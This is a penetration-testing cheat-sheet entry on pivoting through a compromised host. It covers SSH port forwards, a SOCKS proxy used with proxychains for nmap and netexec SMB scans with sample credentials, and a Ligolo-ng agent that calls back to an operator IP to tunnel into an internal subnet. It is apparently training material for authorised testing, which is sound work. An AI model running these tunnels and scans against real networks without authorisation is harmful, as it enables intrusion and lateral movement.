---
tool: Pivoting and tunnelling
slug: pivoting
kind: technique
stages: [command-and-control]
category: Reaching an internal network through a foothold
platforms: [linux, windows, network]
services: [ssh]
ports: [22]
tags: [pivoting, tunnelling, ssh, proxychains, port-forward, socks, ligolo]
attack: [T1090, T1572]
summary: Using a compromised host to reach the network behind it. SSH port forwards, a SOCKS proxy through proxychains, or a userland VPN with Ligolo-ng, so your tools on the outside hit internal targets.
references:
  - The Hacker Recipes: pivoting | https://www.thehacker.recipes/infra/pivoting
  - Ligolo-ng | https://github.com/nicocha30/ligolo-ng
---

## SSH forwards

```bash
# Local: bring one internal service to your localhost
ssh -L 3389:172.16.5.19:3389 user@FOOTHOLD      # 127.0.0.1:3389 -> internal RDP
# Remote: expose a port on the foothold back to your service
ssh -R 8000:127.0.0.1:8000 user@FOOTHOLD
# Dynamic: a SOCKS proxy over SSH for everything
ssh -D 1080 user@FOOTHOLD                        # then use proxychains
```

## proxychains

```bash
# /etc/proxychains4.conf -> socks5 127.0.0.1 1080
proxychains -q nmap -sT -Pn -p 445,3389 172.16.5.0/24
proxychains -q netexec smb 172.16.5.0/24 -u jsmith -p 'Winter2026!'
# SOCKS carries TCP only; use -sT connect scans, no ICMP/UDP
```

## Ligolo-ng (userland VPN, no proxychains)

```bash
# On your box: start the proxy and add a route to the internal subnet
./proxy -selfcert
sudo ip tuntap add user $USER mode tun ligolo && sudo ip link set ligolo up
sudo ip route add 172.16.5.0/24 dev ligolo
# On the foothold: connect the agent back
./agent -connect 10.10.14.5:11601 -ignore-cert
# In the proxy console: session; start -> now reach 172.16.5.0/24 directly
```

## Notes

[Chisel](/cpts/#tool-chisel) does the same over HTTP when SSH is not available. SOCKS handles TCP only, so run `nmap -sT -Pn` and expect ping to fail through the tunnel. Ligolo-ng is the cleanest for a whole subnet (no proxychains, real routing). Tear tunnels down afterwards and record the pivot path.
